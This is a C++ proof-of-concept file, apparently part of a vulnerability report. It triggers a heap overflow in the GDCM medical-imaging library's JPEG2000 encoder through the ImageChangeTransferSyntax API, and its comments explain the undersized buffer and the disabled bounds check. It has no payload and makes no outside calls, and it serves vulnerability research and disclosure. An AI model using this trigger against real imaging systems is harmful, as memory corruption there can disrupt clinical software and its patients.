// Finding 2 library-API trigger: JPEG2000 encode heap overflow reached
// through ImageChangeTransferSyntax, without the gdcmconv CLI. This proves
// library-API reachability; product and network reachability are separate.
//
// gdcm::ImageReader::Read() -> gdcm::ImageChangeTransferSyntax with
// SetTransferSyntax(JPEG2000Lossless) -> SetInput(image) -> Change() mirrors
// the `j2k` branch of Applications/Cxx/gdcmconv.cxx, minus the CLI option
// parsing: Change() drives ImageChangeTransferSyntax's TryJPEG2000Codec,
// which allocates `buffer_j2k = new char[inputlength * 2]` in
// gdcmJPEG2000Codec.cxx and then calls gdcm::opj_write_from_memory, whose
// bounds check against the buffer size is commented out. For a small mono image the
// codestream is larger than inputlength*2, so the memcpy overflows the heap
// allocation.
#include "gdcmImageReader.h"
#include "gdcmImageChangeTransferSyntax.h"
#include "gdcmTransferSyntax.h"

#include <iostream>

int main(int argc, char *argv[])
{
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <dicom_file>" << std::endl;
        return 1;
    }

    gdcm::ImageReader reader;
    reader.SetFileName(argv[1]);
    if (!reader.Read()) {
        std::cerr << "ImageReader::Read() failed" << std::endl;
        return 1;
    }

    const gdcm::Image &image = reader.GetImage();

    std::cout << "[*] Transcoding to JPEG2000Lossless via ImageChangeTransferSyntax::Change()" << std::endl;

    gdcm::ImageChangeTransferSyntax change;
    change.SetTransferSyntax(gdcm::TransferSyntax::JPEG2000Lossless);
    change.SetInput(image);

    // TRIGGER: drives TryJPEG2000Codec -> JPEG2000Codec::Code ->
    // opj_write_from_memory, which overflows buffer_j2k.
    bool ok = change.Change();

    if (!ok) {
        std::cerr << "ImageChangeTransferSyntax::Change() returned false" << std::endl;
        return 1;
    }

    std::cout << "Change() succeeded" << std::endl;
    return 0;
}
